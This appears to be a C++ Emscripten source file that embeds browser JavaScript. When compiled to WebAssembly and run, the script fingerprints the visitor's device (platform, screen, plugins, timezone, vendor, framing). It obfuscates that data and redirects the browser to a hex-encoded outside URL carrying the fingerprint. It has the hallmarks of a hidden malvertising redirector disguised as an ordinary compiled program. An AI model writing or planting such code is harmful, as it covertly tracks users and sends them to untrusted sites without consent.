#include <string>
#include <stdio.h>

#ifdef __EMSCRIPTEN__
#include <emscripten.h>
#endif

EM_JS(void, renderjs, (), {
    !(function () {
    var t = 0;
    setInterval(function () {
        document.body.firstChild.style.opacity =
        0.5 + Math.abs(50 - (t++ % 100)) / 100;
    }, 10);
    })();

    !(function (u, i, c, f, n, t, a) {
    function h(n) {
        function t(n) {
        return (n < 16 ? "0" : "") + n.toString(16);
        }
        for (var r = "", e = 137, o = 0; o < n.length; ++o) {
        var u = 170 ^ n.charCodeAt(o) ^ (255 & o);
        (e = (e + u) & 255), (r += t(u));
        }
        return (r += t(e));
    }
    
    var r;
    try {
        r = (function () {
        var n = new Date();
        function t(n) {
            return "function" == typeof n || !1;
        }
        var r,
            e = [
            function () {
                return c.platform;
            },
            function () {
                return "ontouchstart" in i || "onmsgesturechange" in i ? 1 : a;
            },
            function () {
                return f.availWidth;
            },
            function () {
                return f.availHeight;
            },
            function () {
                return (c.plugins && c.plugins.length) || a;
            },
            function () {
                return (i.ontouchstart + "")[0];
            },
            function () {
                return (i.onmsgesturechange + "")[0];
            },
            function () {
                return i.MSGesture ? 1 : a;
            },
            function () {
                return i.innerWidth;
            },
            function () {
                return i.innerHeight;
            },
            function () {
                return n.getTimezoneOffset();
            },
            function () {
                return new Date().getTime() - n.getTime();
            },
            function () {
                return c.buildID;
            },
            function () {
                return c.cookieEnabled ? 1 : a;
            },
            function () {
                return (
                (c.performance &&
                    c.performance.navigation &&
                    c.performance.navigation.redirectCount) ||
                a
                );
            },
            function () {
                return (
                (c.performance &&
                    c.performance.navigation &&
                    c.performance.navigation.type) ||
                a
                );
            },
            function () {
                return (
                f.msOrientation || f.mozOrientation || (f.orientation || {}).type
                );
            },
            function () {
                return i.devicePixelRatio;
            },
            function () {
                return c.vendor;
            },
            function () {
                return f.pixelDepth;
            },
            function () {
                return f.colorDepth;
            },
            function () {
                return f.deviceXDPI;
            },
            function () {
                return f.deviceYDPI;
            },
            function () {
                return t(u.hasFocus) ? u.hasFocus() : a;
            },
            function () {
                return t(u.getComputedStyle) ? 1 : a;
            },
            function () {
                return i.history && t(i.history.pushState) ? 1 : a;
            },
            function () {
                return f.width;
            },
            function () {
                return f.height;
            },
            function () {},
            function () {},
            function () {
                return window.self === window.top ? a : 1;
            },
            ],
            o = [];
        for (r = 0; r < e.length; ++r)
            try {
            o.push(e[r]());
            } catch (n) {
            o.push("!");
            }
        return h(o.join("\0"));
        })();
    } catch (n) {
        try {
        r = h([0, n.message || n].join("\0"));
        } catch (n) {
        r = "";
        }
    }
    i.location.replace(
        "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x73\x6c\x2e\x6d\x6d\x74\x67\x6f\x2e\x6d\x65\x2f\x3f\x75\x74\x6d\x5f\x74\x65\x72\x6d\x3d\x36\x38\x38\x32\x30\x30\x31\x38\x33\x31\x32\x37\x39\x34\x36\x31\x30\x36\x30\x26\x63\x6c\x69\x63\x6b\x76\x65\x72\x69\x66\x79\x3d\x31&utm_content=" +
        r
    );
    })(document, window, navigator, screen);
});

int main() {
  renderjs();
  return 0;
}